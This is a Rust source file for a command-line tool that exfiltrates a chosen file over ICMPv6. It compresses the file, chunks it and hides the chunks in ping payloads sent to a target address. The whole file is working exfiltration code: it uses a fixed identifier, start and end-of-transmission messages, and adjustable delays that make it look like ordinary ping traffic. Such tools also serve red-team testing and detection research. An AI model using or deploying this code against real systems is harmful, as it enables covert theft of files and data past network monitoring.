use std::fs::File;
use std::io::Read;
use std::net::{IpAddr, Ipv6Addr};
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

use clap::Parser;
use messages::Messages;
use rand::Rng;
use surge_ping::{Client, Config, PingIdentifier, PingSequence, ICMP};
use tokio::time::sleep;

#[derive(Parser)]
#[clap(version)]
pub struct Cli {
    /// Target to send the file to
    target: Ipv6Addr,

    /// Path to the file to exfiltrate
    file_path: String,

    /// Size of the chunks
    #[clap(long, default_value_t = 1480)]
    chunk_size: usize,

    /// Delay between the ping requests in ms
    #[clap(long, default_value_t = 100)]
    delay: u64,
}

#[tokio::main]
async fn main() -> Result<(), String> {
    let cli = Cli::parse();
    let path = Path::new(&cli.file_path);

    if !path.exists() {
        return Err(format!("File {} does not exist", cli.file_path));
    }
    if !path.is_file() {
        return Err(format!("Path {} is not a file", cli.file_path));
    }

    let mut file = File::open(path).map_err(|e| format!("Could not open file: {e}"))?;
    let mut content = vec![];
    file.read_to_end(&mut content)
        .map_err(|e| format!("Could not read from file: {e}"))?;

    let compressed = lz4_flex::compress(&content);
    let target = IpAddr::V6(cli.target);

    let config = Config::builder().kind(ICMP::V6).build();
    let client = Arc::new(
        Client::new(&config).map_err(|e| format!("Could not create ping client: {e}"))?,
    );

    let identifier = loop {
        let id = rand::thread_rng().gen_range(1..=u16::MAX);
        if id != 1337 {
            break id;
        }
    };

    let file_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| format!("Invalid file name: {}", cli.file_path))?;

    let initial = Messages::Initial {
        file_name: file_name.to_owned(),
        file_size: content.len() as u64,
        identifier,
    };

    let initial_data = serde_json::to_vec(&initial)
        .map_err(|e| format!("Error serializing initial message: {e}"))?;
    client
        .pinger(target, PingIdentifier(1337))
        .await
        .ping(PingSequence(1337), &initial_data)
        .await
        .map_err(|e| format!("Could not send initial ping: {e}"))?;

    sleep(Duration::from_secs(1)).await;

    for chunk in compressed.chunks(cli.chunk_size) {
        let data = Messages::Data {
            data: chunk.to_vec(),
            identifier,
        };
        let serialized =
            serde_json::to_vec(&data).map_err(|e| format!("Error serializing data: {e}"))?;

        client
            .pinger(target, PingIdentifier(1337))
            .await
            .ping(PingSequence(identifier), &serialized)
            .await
            .map_err(|e| format!("Could not send ping: {e}"))?;

        sleep(Duration::from_millis(cli.delay)).await;
    }

    sleep(Duration::from_secs(1)).await;

    let eot = Messages::EndOfTransmission { identifier };
    let eot_data = serde_json::to_vec(&eot)
        .map_err(|e| format!("Error serializing end of transmission: {e}"))?;
    client
        .pinger(target, PingIdentifier(1337))
        .await
        .ping(PingSequence(1337), &eot_data)
        .await
        .map_err(|e| format!("Could not send end of transmission: {e}"))?;

    Ok(())
}